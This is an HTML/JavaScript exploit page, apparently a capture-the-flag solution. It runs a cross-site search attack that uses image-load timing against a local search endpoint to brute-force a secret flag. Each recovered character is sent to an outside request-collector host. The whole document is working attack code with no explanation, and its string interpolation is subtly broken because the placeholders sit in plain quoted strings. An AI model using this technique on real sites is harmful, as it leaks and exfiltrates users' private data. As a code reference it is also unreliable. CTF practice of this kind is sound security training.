<img id="img">
<img id="img1">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const img1 = document.getElementById("img1");
            img1.src = url;
            img1.onload = () => { 
                if (img1.width != 0 || img1.height != 0)
                    return resolve();
                else
                    return reject();
            };
        });
    }

    async function search(query) {
        try {
            await req(
              "http://127.0.0.1:8000/search?q=${query}"
            );
            return true;
        } catch (e) {
            return false;
        }
    }

    async function exploit() {
        let chars = "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}"
        let secret = "";

        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = "https://jgpxjev.request.dreamhack.games/?c=${secret}";
                    break;
                }
            }
        }
    }
    exploit();
</script>
